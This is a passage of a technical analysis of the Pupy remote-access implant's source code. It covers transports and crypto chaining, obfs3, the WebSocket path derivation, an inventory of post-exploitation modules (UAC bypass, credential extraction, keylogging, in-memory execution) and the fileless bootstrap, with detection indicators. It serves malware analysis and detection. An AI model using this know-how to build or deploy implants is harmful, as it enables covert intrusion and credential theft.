| `ssl_rsa` | 4,304 B | `PupySocketStream` | RSA/AES **inside TLS** |
| `tcp_cleartext` | 818 B | `PupySocketStream` | `DummyPupyTransport` — **plaintext** |
| `udp_cleartext` | 840 B | `PupyUDPSocketStream` | `DummyPupyTransport` — **plaintext UDP** |
| `udp_secure` | 2,007 B | `PupyUDPSocketStream` | RSA/AES over UDP |
| `ws` | 3,142 B | `PupySocketStream` | `chain_transports` (WebSocket + RSA/AES) |

`[source: measured pupy/network/transports/*/conf.py; names at each conf.py's `class TransportConf`]`

**`tcp_cleartext` and `udp_cleartext` ship as first-class transports.** They exist for internal pivoting and loopback, but they are selectable by name, and `tcp_cleartext` `[source: pupy/network/transports/tcp_cleartext/conf.py:15-19]` uses `DummyPupyTransport` — no crypto at all. A session over these is fully readable on the wire. `[source: tcp_cleartext/conf.py:13-19; udp_cleartext/conf.py:13-19]`

Note also that `ec4` and `kc4` **share the same transport class** (`EC4TransportClient`) and differ only in stream (`PupySocketStream` vs `PupyUDPSocketStream`). So "EC4" is not one transport but two, TCP and UDP, over identical crypto. `[source: ec4/conf.py:16; kc4/conf.py:15-16]`

### 5.2 The registry — auto-discovery by `pkgutil`

```python
# pupy/network/conf.py:22-52
transports = {}
launchers = {}

def add_transport(module_name):
    try:
        confmodule = importlib.import_module(
            'pupy.network.transports.{}.conf'.format(module_name))
        if not confmodule:
            logging.warning('Import failed: %s', module_name)
            return
        if not hasattr(confmodule, 'TransportConf'):
            logging.warning('TransportConf is not present in %s', module_name)
            return
        t = confmodule.TransportConf
        if t.name is None:
            t.name = module_name
        transports[t.name] = t
        logging.debug('Transport loaded: %s', t.name)
    except Exception as e:
        logging.exception('Transport disabled: %s: %s', module_name, e)

def load_network_modules():
    for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
        add_transport(module_name)
```
`[source: pupy/network/conf.py:22-52]`

**There is no hardcoded transport list.** Every subdirectory of `pupy/network/transports/` that contains a `conf.py` exporting a `TransportConf` becomes a selectable transport, discovered at runtime by `pkgutil.iter_modules`. Four consequences:

1. **The transport set is a build artefact, not a source constant.** A payload built with a subset of transport directories contains only those transports; the `transports` dict reflects whatever was packaged. Static analysis of the repo shows 13, but any *given* payload may have fewer. `[source: conf.py:50-52; inference]`
2. **Failures are swallowed.** `add_transport` catches `Exception` and logs "Transport disabled" (`:46-47`) — a broken transport silently disappears rather than failing the build. A dependency-import error inside a `conf.py` removes that transport with only a log line. `[source: conf.py:46-47]`
3. **`t.name = module_name` is a fallback only** (`:40-41`) — every in-tree transport sets `name` explicitly, so the fallback is dead in practice but would silently name a transport after its directory. `[source: conf.py:40-41]`
4. **`TransportConf` is found by `hasattr`, not by a base-class check** (`:35`) — any class with a `name` attribute qualifies. There is no `issubclass(Transport)` validation, so a malformed `conf.py` can register an arbitrary object. `[source: conf.py:35-43]`

The launchers are registered the opposite way — **explicitly and individually**, each in its own `try`:

```python
# pupy/network/conf.py:54-79
try:
    from .lib.launchers.connect import ConnectLauncher
    launchers['connect'] = ConnectLauncher
except Exception as e:
    logging.exception('%s: ConnectLauncher disabled', e)

try:
    from .lib.launchers.auto_proxy import AutoProxyLauncher
    launchers['auto_proxy'] = AutoProxyLauncher
except Exception as e:
    logging.exception('%s: AutoProxyLauncher disabled', e)

try:
    from .lib.launchers.bind import BindLauncher
    launchers['bind'] = BindLauncher
except Exception as e:
    logging.exception('%s: BindLauncher disabled', e)

try:
    from .lib.launchers.dnscnc import DNSCncLauncher
    launchers.update({'dnscnc': DNSCncLauncher})
except Exception as e:
    logging.exception('%s: DNSCncLauncher disabled', e)
    DNSCncLauncher = None
```
`[source: pupy/network/conf.py:54-79]`

**Four launchers**: `connect`, `auto_proxy`, `bind`, `dnscnc` — each mapping to `LAUNCHER_TYPE_CONNECT`/`BIND`/`DNSCNC` (or `ALL`) via the §3.3 integer enum. `auto_proxy` corresponds to `LAUNCHER_TYPE_ALL`; the other three are the enum values. `[source: conf.py:54-79; §3.3 for the enum]`

### 5.3 `chain_transports` — the composition mechanism

The transports are not alternatives to each other; they **compose as layers**. The pattern is identical in `obfs3`, `ws`, `http`, `dfws`:

```python
# pupy/network/transports/obfs3/conf.py:37-54
if self.launcher_type == LAUNCHER_TYPE_BIND:
    self.client_transport = chain_transports(
            Obfs3Client,
            RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
        )
    self.server_transport = chain_transports(
            Obfs3Server,
            RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
        )
else:
    self.client_transport = chain_transports(
            Obfs3Client,
            RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
        )
    self.server_transport = chain_transports(
            Obfs3Server,
            RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
        )
```
`[source: pupy/network/transports/obfs3/conf.py:37-54]`

Three structural facts:

1. **The `BIND` branch swaps which side holds the private key.** In the normal (connect) branch the **client** holds the RSA *public* key and the **server** holds the *private* key. Under `LAUNCHER_TYPE_BIND` the payload is the listener, so the roles invert: the client side gets `RSA_AESServer` with the *private* key and the server side gets `RSA_AESClient` with the *public* key. This is the mechanism by which one `TransportConf` serves both directions, and it means **a bind payload embeds the RSA private key**. `[source: obfs3/conf.py:37-54]`
2. **All RSA chains are pinned to 4096-bit RSA and 256-bit AES** (`rsa_key_size=4096, aes_size=256`), repeated verbatim in every conf. There is no negotiation — the sizes are compile-time constants at each call site. `[source: obfs3/conf.py:40,44,50,54; ws/conf.py:58,62,68,72; rsa/conf.py:35,39; ssl_rsa/conf.py:124,127; udp_secure/conf.py:39,43]`
3. **Credentials load with a two-tier fallback**: first `import pupy_credentials` (a generated module baked into the payload), and on `ImportError`, `Credentials()` from `pupy/pupylib/PupyCredentials.py` (§3.2's credvault). `[source: obfs3/conf.py:26-35; ws/conf.py:32-42]`

The `credentials` class attribute declares **which** secrets a transport needs, so the payload builder embeds only those:

| Transport | `credentials` |
|---|---|
| `obfs3` | `['SIMPLE_RSA_PUB_KEY', 'SIMPLE_RSA_PRIV_KEY']` |
| `ws` | `['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY', 'PATH_GEN_SECRET']` |
| `ec4` | (EC key pair — §3.1) |

`[source: obfs3/conf.py:21; ws/conf.py:26]`

Notably `obfs3` requests **both** the public and private RSA key (`obfs3/conf.py:21`) even though the connect branch only uses the public one — because the `BIND` branch needs the private key. So **every obfs3 payload carries the operator's RSA private key regardless of launcher type**, which is a classified-secret exposure in any payload built with obfs3. `[source: obfs3/conf.py:21, 37-45]`

### 5.4 `ws` — the WebSocket transport and its static secret-derived path

```python
# pupy/network/transports/ws/conf.py:14-53
from hashlib import md5

DEFAULT_USER_AGENT = \
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ' \
  '(KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'
...
credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY', 'PATH_GEN_SECRET']
internal_proxy_impl = ['HTTP']
...
self.client_transport_kwargs.update({
    'host': None,
    'path': '/ws/' + ''.join(md5(PATH_GEN_SECRET+b"ws").hexdigest()[:8]),
    'user-agent': DEFAULT_USER_AGENT
})

self.server_transport_kwargs.update({
    'path': '/ws/' + ''.join(md5(PATH_GEN_SECRET+b"ws").hexdigest()[:8]),
    'user-agent': DEFAULT_USER_AGENT
})
```
`[source: pupy/network/transports/ws/conf.py:14-53]`

**This is the single most fingerprintable element in the transport layer.** The WebSocket endpoint path is:

```
/ws/  +  first 8 hex characters of MD5( PATH_GEN_SECRET + b"ws" )
```
`[source: ws/conf.py:46, 51]`

Four findings:

1. **The path is a pure function of the secret and the literal `b"ws"`.** It is computed at conf-construction time and **never varies per session, per host, or per connection**. There is no nonce. So every payload built from the same `PATH_GEN_SECRET` uses **the same 8-hex-character path forever**, across all victims and all time. `[source: ws/conf.py:46, 51]`
2. **The prefix is the literal `/ws/`.** The code does not even hide that it is a WebSocket endpoint — the path announces it. `[source: ws/conf.py:46]`
3. **Only 8 hex characters (32 bits) of MD5 are used**, and the input is `secret ‖ "ws"` — a **fixed, known suffix**. So the path space is 2^32 and the input is a keyed constant, meaning the path is a **deterministic secret-dependent constant** rather than a random identifier. An operator reusing `PATH_GEN_SECRET` across engagements has a stable, correlatable beacon path. `[source: ws/conf.py:46]`
4. **`md5` is used as a keyed derivation here** (`from hashlib import md5`, `ws/conf.py:14`) — not for integrity, but to derive a path from a secret. MD5 is unnecessary; any hash would do. It is a leftover. `[source: ws/conf.py:14, 46, 51]`

The user agent is a **hardcoded Chrome 60 UA from 2017**:

```
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
```
`[source: ws/conf.py:16-18]` — `Chrome/60.0.3112.90` is a 2017 build, and `Windows NT 6.1` is Windows 7. So a WebSocket Pupy session from a modern host **sends a 2017 Chrome UA claiming Windows 7** — a direct, trivially-written network signature. This exact string is a high-confidence IOC. `[source: ws/conf.py:16-18; inference on version dating]`

`internal_proxy_impl = ['HTTP']` (`:27`) marks the transport as eligible for the internal proxy, which is what enables pivoting through the victim without a separate proxy binary. `[source: ws/conf.py:27; §3.3 for the attribute]`

### 5.5 `obfs3` — a faithful Tor pluggable-transport port

`obfs3` is not a Pupy invention; it is a **port of the Tor `obfsproxy` obfs3 protocol**, and the port is close enough that Tor's own constants survive verbatim:

```python
# pupy/network/lib/transports/obfs3/obfs3.py:27-36
MAX_PADDING = 8194

PUBKEY_LEN = 192
KEYLEN = 16  # is the length of the key used by E(K,s) -- that is, 16.
HASHLEN = 32 # length of output of sha256

ST_WAIT_FOR_KEY = 0 # Waiting for public key from the other party
ST_WAIT_FOR_HANDSHAKE = 1 # Waiting for the DH handshake
ST_SEARCHING_MAGIC = 2 # Waiting for magic strings from the other party
ST_OPEN = 3 # Sending application data.
```
`[source: pupy/network/lib/transports/obfs3/obfs3.py:27-36]`

`MAX_PADDING = 8194`, `PUBKEY_LEN = 192`, `KEYLEN = 16`, `HASHLEN = 32` are the **exact obfs3 specification constants** (192-byte UniformDH public key, 16-byte AES key, SHA-256, 8194-byte padding cap). The comments are lifted from the obfsproxy source, including the trailing `# is the length of the key used by E(K,s) -- that is, 16.` `[source: obfs3.py:27-31]`

The handshake is the obfs3 three-phase state machine:

```python
# obfs3.py:88-105
def circuitConnected(self):
    """
    Do the obfs3 handshake:
    PUBKEY | WR(PADLEN)
    """
    padding_length = random.randint(0, MAX_PADDING/2)
    public_key = self.dh.get_public()
    handshake_message = public_key + get_random(padding_length)
    ...
    self.downstream.write(handshake_message)
```
`[source: pupy/network/lib/transports/obfs3/obfs3.py:88-105]` — `PUBKEY ‖ random padding`, with the padding length uniform in `[0, 4097)`. `MAX_PADDING/2` is a **float division** — under `from __future__ import division` (`:8`) this is `4097.0`, so `random.randint(0, 4097.0)` receives a float. CPython's `randint` calls `randrange` which **accepts floats by coercing via `int()`** in older versions but raises `ValueError` for non-integer arguments in the way `randrange` documents; this is a latent incompatibility. The equivalent line at `:233` uses the integer form `MAX_PADDING//2`. So **the same file uses `/` at `:93` and `//` at `:233` for the same computation** — one of the two is the intended form and they disagree on the upper bound (`4097.0` vs `4097`). `[source: obfs3.py:93, 233; inference]`

The magic values are **HMAC-SHA256 over the shared secret**, which is the correct construction — and a deliberate contrast with the SHA-1 prefix-hash used in `ecpv.gen_csum` (§2.10):

```python
# obfs3.py:222-241
self.shared_secret = shared_secret
self.send_crypto = self._derive_crypto(self.send_keytype)
self.recv_crypto = self._derive_crypto(self.recv_keytype)
self.other_magic_value = hmac_sha256_digest(
    self.shared_secret, self.recv_magic_const)

# Send our magic value to the remote end
# Padding is prepended so that the server does not just send the 32-byte magic
# in a single TCP segment.
padding_length = random.randint(0, MAX_PADDING//2)
magic = hmac_sha256_digest(self.shared_secret, self.send_magic_const)
message = get_random(padding_length) + magic
self.state = ST_SEARCHING_MAGIC
self.downstream.write(message)
```
`[source: pupy/network/lib/transports/obfs3/obfs3.py:222-241]`

**So the codebase contains both a correct HMAC-SHA256 construction and an incorrect SHA-1-prefix construction for the same purpose**, in the same package family. `gen_csum` (§2.10) uses `SHA1(key ‖ message ‖ len ‖ nonce)[:4]` — length-extendable, 32-bit; obfs3 uses `HMAC-SHA256(secret, const)` — full-strength, 256-bit. The obfs3 author knew the right way; the ecpv author did not. `[source: obfs3.py:227, 237 vs ecpv.py:283-289; inference]`

The comment at `:231-232` documents the *purpose* of obfs3's padding: `"Padding is prepended so that the server does not just send the 32-byte magic in a single TCP segment."` That is the obfs3 design goal — **defeat packet-length fingerprinting of the handshake**. obfs3 is therefore the one transport in this codebase explicitly designed against traffic analysis, and it is layered *under* RSA/AES (`obfs3/conf.py:48-51`), so a default obfs3 session is obfuscated-then-encrypted. `[source: obfs3.py:231-232; obfs3/conf.py:48-51]`

The DH is `UniformDH`, from the vendored `obfs3_dh.py`:

```python
# obfs3_dh.py:32
priv_str, a byte string representing our DH private key.
```
`[source: pupy/network/lib/transports/obfs3/obfs3_dh.py:32]` — a distinct DH implementation (1024-bit MODP with the "uniform" technique to make the key material uniformly distributed), separate from the ECPV elliptic-curve path. So Pupy ships **two entirely independent key-exchange implementations**: ECPV (`tinyec`, elliptic curve) and `UniformDH` (integer modular exponentiation, Tor-derived). `[source: obfs3_dh.py; §2 for ECPV]`

Error handling in obfs3 is a **hard failure**, not a fallback:

```python
# obfs3.py:201-211
def _uniform_dh_errback(self, failure, other_pubkey):
    if __debug__:
        logger.warning("obfs3: Corrupted public key '%s'" % repr(other_pubkey))
    raise EOFError('Corrupted public key ({})'.format(failure))
```
`[source: pupy/network/lib/transports/obfs3/obfs3.py:201-211]` — a bad DH key raises `EOFError`, which the session layer treats as a dead connection. This is the same `EOFError`-on-crypto-failure pattern as EC4 (`ec4.py:67, :76`). `[source: obfs3.py:211; §3.1]`

`receivedDownstream` (`:133-169`) is a **linear `if`/`if` chain, not `elif`** — each state is tested in sequence and multiple can fire in one call, which is intentional here (a single buffer can complete `ST_WAIT_FOR_KEY` and advance), but it means the state machine relies on each handler re-checking `self.state` internally. `[source: obfs3.py:139-169]`

---

## 6. The post-exploitation surface — `packages/`

`packages/` is the capability layer: every module is an importable unit the operator can push to the implant at runtime, executed through the synthetic importer (§1.4, §6.1). It is organised by platform, and the platform directories are **not** mutually exclusive — `packages/all/` holds cross-platform modules, `packages/windows/all/` Windows-only, and so on.

### 6.1 The four largest modules, and what their size says

Size is a proxy for capability concentration. Within `packages/all/`:

| Module | Size | What the size means |
|---|---|---|
| `winerror.py` | **104,652 B** | A generated table of every Windows error code with message text |
| `ad.py` | **43,895 B** | Active Directory enumeration and abuse |
| `ssh.py` | **43,705 B** | Full SSH client implementation |
| `pyuvproxy.py` | **33,686 B** | A proxy server implementation |
| `scandir.py` | **24,676 B** | Directory enumeration |
| `transfer.py` | **24,889 B** | File transfer |

`[source: measured pupy/packages/all/]`

`winerror.py` is **104 KB of a single module** — 2.4× the next-largest. It is a lookup table, not logic: the operator's error-message lookup so failures come back as readable strings rather than bare NTSTATUS values. That is a **debugging convenience shipped to the implant**, and it is the largest thing in the package tree. `[source: measured; inference]`

`ad.py` and `ssh.py` at ~44 KB each are the real capability concentrates: AD enumeration/abuse for lateral movement, and a complete SSH client for the same. `[source: measured pupy/packages/all/ad.py, ssh.py]`

### 6.2 `packages/windows/all/` — the Windows surface

36 Python files, and the largest by a wide margin is not a `.py`-logic module but a **credential/security toolkit**:

| Module | Size | Capability |
|---|---|---|
| `pupwinutils/security.py` | **78,800 B** | LSA/credential/privilege/security-descriptor toolkit |
| `reg.py` | 24,800 B | Registry read/write/ACL |
| `readlogs.py` | 18,599 B | Event-log reading |
| `fsutils_ext.py` | 19,202 B | Extended filesystem operations |
| `powershell.py` | 14,953 B | PowerShell execution |
| `bypassuac_token_imp.py` | 15,247 B | UAC bypass via token impersonation |
| `outlook.py` | 12,817 B | Outlook data extraction |
| `conpty.py` | 8,919 B | Console PTY via ConPTY |
| `keylogger.py` | 9,478 B | Keystroke capture |
| `winpty.py` | 9,084 B | Console PTY via WinPTY |
| `hookfuncs.py` | 8,249 B | API hooking |
| `memexec.py` | 7,350 B | In-memory executable execution |
| `pipecatcher.py` | 6,994 B | Named-pipe interception |
| `readlogs.py`, `reg.py`, `ntfs_streams.py`, `junctions.py`, `netresources.py` | — | Filesystem/registry/net primitives |

`[source: measured pupy/packages/windows/all/*]`

**`security.py` at 78,800 B — 4× the next Windows module and 75% of the size of the entire `packages/all/` top six combined — is the single largest authored file in the package layer.** It is the Windows privilege and credential toolkit. `[source: measured]`

The explicit capability names present in the tree, with no interpretation needed:

- **`bypassuac_registry.py`** and **`bypassuac_token_imp.py`** — two independent UAC-bypass implementations, one registry-based, one token-impersonation-based. `[source: measured filenames]`
- **`wdigest.py`** — WDigest credential extraction. `[source: measured filenames]`
- **`keylogger.py`** and **`mouselogger.py`** — input capture, both. `[source: measured filenames]`
- **`shellcode.py`** — shellcode execution. `[source: measured filenames]`
- **`memexec.py`**, **`powerloader.py`** — in-memory execution paths. `[source: measured filenames]`
- **`drives.py`**, **`getdomain.py`**, **`processes.py`**, **`rdp.py`**, **`msgbox.py`** — enumeration and interaction. `[source: measured filenames]`

The module names alone constitute an accurate capability inventory; no code reading is required to establish what this layer can do.

### 6.3 `agent/memimporter/` — the in-memory PE loader

```python
# pupy/agent/memimporter/__init__.py       1034 B
# pupy/agent/memimporter/linux.py          3460 B
# pupy/agent/memimporter/posix.py          1818 B
# pupy/agent/memimporter/utils.py          8395 B
# pupy/agent/memimporter/win32.py          1400 B
```
`[source: measured pupy/agent/memimporter/*]`

A per-platform in-memory shared-object/PE loader. `linux.py` and `posix.py` handle ELF `dlopen`-from-memory; `win32.py` (1,400 B) is a thin shim over the heavy lifting, which lives in C — the `MemoryModule.c` / `MyLoadLibrary.c` in `client/sources-windows-py3/` (§1, 51,876 B and 27,034 B respectively). `utils.py` at 8,395 B holds the platform-independent logic. `[source: measured; §1 for the C side]`

This is the mechanism that makes the whole architecture work: **the implant can load a native library from bytes with no file touching disk**, which is what `load_dll(name, buf=None)` at `agent/__init__.py:369` exposes and what the `memimporter` fallback installs:

```python
# agent/__init__.py:956-969
def load_memimporter_fallback():
    global _import_module
    global _load_dll

    if not is_supported(_import_module):
        try:
            from .memimporter import load_dll, import_module

            _import_module = import_module
            _load_dll = load_dll
        except ImportError:
            import traceback
            dprint('memimporter is not available')
            dprint(traceback.format_exc(), error=True)
```
`[source: pupy/agent/__init__.py:956-969]`

The `is_supported` guard (`:83`) means the C-accelerated path is preferred when present and this Python fallback is used only when it is not — a **two-tier implementation of the same capability**. `[source: agent/__init__.py:83, :956-969]`

### 6.4 `setup_credentials` — the runtime credential-module construction

This is the hinge between the operator's configuration and every transport's credential lookup (§5.3):

```python
# agent/__init__.py:972-978
def setup_credentials(config):
    if 'credentials' not in config:
        return

    credentials = make_module('pupy_credentials')
    for cred, value in config.pop('credentials').items():
        setattr(credentials, cred, value)
```
`[source: pupy/agent/__init__.py:972-978]`

Three consequences:

1. **`pupy_credentials` does not exist on disk** — it is synthesized in memory by `make_module` (`:449`) from the `credentials` dict in the config passed in from the C loader (`§1.7`: `pupy.agent.main(None, debug, config, stdlib)`). This is why every transport does `try: import pupy_credentials / except ImportError:` (§5.3) — the import succeeds **only** inside a running payload. `[source: agent/__init__.py:972-978; §1.7]`
2. **`config.pop('credentials')` *removes* the credentials from the config dict** (`:977`). The secrets are moved out of the config and into module attributes, so the `config` dict the rest of the agent sees no longer contains them. That is a deliberate reduction of the blast radius of a config dump — but the credentials are still live as attributes on a module in `sys.modules`. `[source: agent/__init__.py:977]`
3. **The credential names are dynamic.** `setattr(credentials, cred, value)` sets whatever keys the config carries, so the set of credentials is determined by the payload build. The class-level `credentials = [...]` lists in each `conf.py` (§5.3) are the *request* side; this is the *supply* side. `[source: agent/__init__.py:976-978; §5.3]`

### 6.5 `PupyPackageFinder` — the synthetic importer

The agent installs a custom `importlib` finder so that `import pupy.something` resolves against the in-memory stdlib dict rather than the filesystem:

```python
# agent/__init__.py:612-618, 830-852 (structure)
class PupyPackageFinder(_bootstrap_external._LoaderBasics):
    def __init__(self, path): ...
    def find_module(self, fullname, path=None, second_pass=False): ...
    def iter_modules(self, fullname, path=None): ...
    def _remote_load_packages(self, fullname, second_pass): ...
```
`[source: pupy/agent/__init__.py:612-825]`

`PupyPackageFinder` subclasses **`_bootstrap_external._LoaderBasics`** — a private `importlib` internal, not a public API. On Python 3.10 (pinned at `§1.2` via `python310.dll`) that private class exists; on any later 3.x it may not, which is a concrete reason the loader is **version-locked to 3.10** rather than merely preferring it. `[source: agent/__init__.py:612; §1.2]`

`_remote_load_packages` (`:658`) is the on-demand fetch: a module not present in the local stdlib dict can be **requested from the operator at import time**, which is what `pupy_hooks.remote_load_package` (`:1017`) is for. So the implant's module set is dynamically extensible after deployment. `[source: agent/__init__.py:658, :1017]`

### 6.6 `prepare` / `main` — the full Python-side bootstrap

```python
# agent/__init__.py:1027-1070
def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
    set_pupy_config(config)

    if config.get('debug', False):
        debug = True

    init_pupy(argv, stdlib, debug)

    dprint("Apply dl_hacks..")
    if "rustc" not in sys.version:
        from .dl_hacks import apply_dl_hacks
        apply_dl_hacks()
    setup_obtain()

    dprint("Register pupyimporter..")
    from pupy.agent.utils import register_pupyimporter
    register_pupyimporter()

    dprint("Prepare rest..")
    from .handlers import set_sighandlers
    from .ssl_hacks import apply_ssl_hacks
    from .psutil_hacks import apply_psutil_hacks
    from pupy.network.conf import load_network_modules

    set_sighandlers()
    apply_ssl_hacks()
    apply_psutil_hacks()
    load_memimporter_fallback()
    setup_credentials(config)
    setup_manager()
    load_network_modules()

    dprint("Prepare complete")

def main(argv=sys.argv, debug=False, config={}, stdlib=None):
    prepare(argv, debug, config, stdlib)

    from .service import run
    run(config)
```
`[source: pupy/agent/__init__.py:1027-1070]`

**This is the Python end of the ABI `§1.7` identified.** `main(None, debug, config, stdlib)` is called by `Python-dynload.c:1055-1061` as `PyObject_CallFunctionObjArgs(py_main, Py_None, py_debug, py_config, py_stdlib, NULL)` — so `argv=None`, and `prepare` then calls `init_pupy(argv, stdlib, debug)` with `argv=None`. The `argv=sys.argv` defaults are therefore **never used in the real path**. `[source: agent/__init__.py:1027, :1066; §1.7 for the C call site]`

Five things the bootstrap deliberately does, each a distinct intent:

1. **`_hacks` module family** — `dl_hacks` (`:1038`), `ssl_hacks` (`:1050`, `:1056`), `psutil_hacks` (`:1051`, `:1057`), `winerror_hacks`. Each monkey-patches a standard library to behave on the implant: `ssl_hacks` (1,481 B) makes TLS work without a CA bundle, `psutil_hacks` (490 B) patches process enumeration, `dl_hacks` (3,308 B) patches dynamic loading. `[source: agent/__init__.py:1038, 1050-1057; measured sizes]`
2. **`"rustc" not in sys.version` guard on `dl_hacks`** (`:1037`) — the loader patches are **skipped on PyOxidizer-built payloads** (which embed a Rust toolchain string in `sys.version`), because that build path has a different loader. This is a runtime discriminator between the two build paths of §1. `[source: agent/__init__.py:1037; §1 for the build paths]`
3. **`setup_obtain`** (`:1007-1011`) installs `safe_obtain` as a global — the guarded-object-access helper. `[source: agent/__init__.py:1007-1011]`
4. **`setup_manager`** (`:981-999`) builds a `Manager` over a `PStore` rooted at `config.get('pstore', '~')` — **the default persistence root is the user's home directory** (`:990`), and the manager/task classes are then **injected as attributes onto the `pupy.agent` module** so that `from pupy.agent import manager` works. `[source: agent/__init__.py:981-999]`
5. **`dprint` throughout** (`:1035-1063`) — the bootstrap narrates its own progress. Under `DEBUG` these reach a console; in production they are suppressed by `set_debug` (`:258`). `[source: agent/__init__.py:258, :1035-1063]`

---

## 7. Call graphs

### 7.1 Windows startup → Python execution

```
[EXE path]                                        [reflectDLL path]
main_exe.c:24 main()                              main_reflective.c:34 DllMain
  :31 initialize(FALSE)                             :51 case DLL_PROCESS_ATTACH
  :33 execute(NULL)                                   :53 initialize(TRUE)
  :35 deinitialize()                                  :55 if lpReserved == (LPVOID)0x1 → execute(NULL)
                                                      :64 if !hThread && lpReserved != 0x2
                                                        → CreateThread(delayedMainThread)
                                                             :22-26 Sleep(1000); execute(lpArg)
                                                            :79-88 DLL_PROCESS_DETACH → WaitForMultipleObjects; deinitialize()
        │                                                    │
        └────────────────────┬───────────────────────────────┘
                             ▼
        pupy_load.c:300-425 initialize()
          :323-329 SetErrorMode(SEM_FAILCRITICALERRORS | ...)
          :334     signal(SIGABRT, OnAbortHandler)
          :366-376 EnableCrashingOnCrashes(); SetUnhandledExceptionFilter(OnThreadCrash)
          :253-280 MyLoadLibraryEx("NTDLL.DLL", ...)          ← private mapping
                    MyLoadLibraryEx("KERNEL32.DLL", ...)      ← private aliased KERNEL32
          :285-299 optional private WS2_32.DLL
          :366-418 args.pvMemoryLibraries = MyGetLibraries()
                    xz_dynload("_pupy.pyd", _pupy_pyd_c_start, _pupy_pyd_c_size, &args)
                    MyGetProcAddress(pupyhMod, "PyInit__pupy") → PyInit__pupy()
                    _PyImport_FixupExtensionObject(m, name, name, modules)
          :412-418 initialize_python(argc, argv, isDll)
                             │
                             ▼
        Python-dynload.c initialize_python()
          :140  hPython = OSLoadLibrary("python310.dll")
          :222-249 PyPreConfig_InitPythonConfig; use_environment=0; Py_PreInitialize
                   PyConfig_InitPythonConfig; _init_main=0; isolated=0
                   site_import=0; user_site_directory=0; write_bytecode=0
                   Py_InitializeFromConfig(&config)
          :82-104 load_stdlib() → PyDict_lzmaunpack(library_c_start, ...)
                                  OSUnmapRegion(library_c_start, library_c_size)   ← LZMA blob erased
          :634-733 py_module_from_stdlib(...)  → PyMarshal_ReadObjectFromString(pybody_c_ptr+8, size-8)
          :886-937 importlib closure preload (keyword → importlib.util)
          :958-988 preload every encodings/* key
          :997  _Py_InitializeMain()
          :1005-1010 py_clear_sys_list("path"); py_clear_sys_dict("path_importer_cache")
          :1024-1034 py_module_from_stdlib(py_stdlib, "pupy", 1)
                     py_module_from_stdlib(py_stdlib, "pupy.agent", 1)
                     py_module_from_stdlib(py_stdlib, "pupy.agent.utils", 0)
          :1055 py_main = PyDict_GetItemString(pupy_dict, "main")
          :1061 PyObject_CallFunctionObjArgs(py_main, Py_None, py_debug, py_config, py_stdlib, NULL)
                             │
                             ▼
        agent/__init__.py:1066 main(argv=None, debug, config, stdlib)
          :1067 prepare(...)
            :1028 set_pupy_config(config)
            :1033 init_pupy(argv, stdlib, debug)
            :1038 apply_dl_hacks()          [skipped if "rustc" in sys.version]
            :1040 setup_obtain()
            :1045 register_pupyimporter()   ← installs PupyPackageFinder
            :1055 set_sighandlers()
            :1056 apply_ssl_hacks()
            :1057 apply_psutil_hacks()
            :1058 load_memimporter_fallback()
            :1059 setup_credentials(config) ← config.pop('credentials') → pupy_credentials module
            :1060 setup_manager()           ← Manager(PStore(config.get('pstore','~')))
            :1061 load_network_modules()    ← pkgutil discovery of all transports (§5.2)
          :1069-1070 from .service import run; run(config)
```
`[sources: main_exe.c:24-35; main_reflective.c:22-88; pupy_load.c:253-425; Python-dynload.c:82-104, 140, 222-249, 634-733, 886-937, 958-988, 997, 1005-1061; agent/__init__.py:1027-1070]`

The chain has **three compression/decompression boundaries and one encryption-free in-memory handoff**: `_pupy.pyd` is xz-compressed and xz-dynloaded (§1.8), the stdlib dict is LZMA-compressed and unpacked (§1.5), and Python bytecode is `marshal`-deserialized with an 8-byte header skip (§1.6). At no point does a file written by the payload touch disk. `[sources as above]`

### 7.2 KEX path (EC4 / `kc4`)

```
Client                                                          Server
EC4TransportClient.on_connect()                                 (waiting)
  ec4.py:114 encoder.generate_kex_request()
    ecpv.py:248 _kex_private_key = _gen_random()
    ecpv.py:249 _kex_public_key = curve.g * _kex_private_key
    ecpv.py:250 return ec2osp(_kex_public_key)
  ec4.py:115-117 downstream.write(struct.pack('H', len(req)) + req)
                    │
                    │      [2-byte native-endian length][EC point]
                    ├──────────────────────────────────────────────►
                                                    EC4Transport.kex(data)
                                                      ec4.py:57  length = unpack_from('H', ...)
                                                      ec4.py:61  request = data.read(2+length)
                                                      ec4.py:65  encoder.process_kex_request(request[2:], 0, key_size=128)
                                                        ecpv.py:254 cache-miss → proceed
                                                        ecpv.py:255 response = generate_kex_request()
                                                        ecpv.py:258 process_kex_response(request, decrypt=False, key_size=128)
                                                          ecpv.py:271 P1 = osp2ec(curve, response)
                                                          ecpv.py:272 key = _mgf2(ec2osp(P1 * _kex_private_key), 128)
                                                          ecpv.py:273 _kex_shared_key = (key, _reversed_bytes(key))
                                                        ecpv.py:259 _kex_shared_key = list(reversed(...))
                                                      ec4.py:70  time.sleep(random.random())      ← 0–1 s jitter
                                                      ec4.py:71  downstream.write(pack('H', len(resp)) + resp)
                    ◄──────────────────────────────────────────────┤
  ec4.py:74 encoder.process_kex_response(request[2:], 0, key_size=128)
    ecpv.py:271 P1 = osp2ec(curve, response)
    ecpv.py:272 key = _mgf2(ec2osp(P1 * _kex_private_key), 128)
    ecpv.py:273 _kex_shared_key = (key, _reversed_bytes(key))
  ec4.py:78 encryptor = RC4(key=key[0])
  ec4.py:79 decryptor = RC4(key=key[1])
  ec4.py:83 encryptor.encrypt(b'\x00'*3072)     ← keystream discard
  ec4.py:84 decryptor.decrypt(b'\x00'*3072)
```
`[sources: ec4.py:57-84; ecpv.py:248-273]`

